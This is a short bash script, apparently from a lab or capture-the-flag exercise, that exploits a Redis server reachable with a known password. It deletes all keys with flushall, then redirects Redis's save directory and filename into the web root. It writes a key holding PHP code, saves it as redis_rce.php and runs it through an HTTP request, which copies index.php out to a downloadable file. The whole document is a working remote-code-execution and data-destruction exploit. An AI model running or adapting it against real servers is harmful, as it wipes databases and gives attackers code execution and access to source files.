#!/usr/bin/env bash

# Redis password from /etc/redis/redis.conf
RP='R3disp@ss'

# PHP code to copy /var/www/html/index.php to /var/www/html/f.txt
PHP="<?php file_put_contents('f.txt', file_get_contents('index.php')); ?>"

echo -n "Delete all keys from all databases: "
redis-cli --raw -a $RP flushall 2>/dev/null

echo -n "Disable Redis DB compression to leave PHP code as-is: "
redis-cli --raw -a $RP config set rdbcompression no 2>/dev/null

echo -n "Set output folder to /var/www/html/ web server root: "
redis-cli --raw -a $RP config set dir /var/www/html 2>/dev/null

echo -n "Set the DB filename to redis_rce.php: "
redis-cli --raw -a $RP config set dbfilename redis_rce.php 2>/dev/null

echo -n "Create 'rce' key containing PHP code: "
redis-cli --raw -a $RP set rce "$PHP" 2>/dev/null

echo -n "Save Redis DB to /var/www/html/redis_rce.php: "
redis-cli --raw -a $RP save 2>/dev/null

echo "Execute 'redis_rce.php' via GET request."
curl http://localhost/redis_rce.php 2>/dev/null

echo "Download http://localhost/f.txt"
curl http://localhost/f.txt --output f.txt 2>/dev/null

echo "Display f.txt"
cat -A f.txt
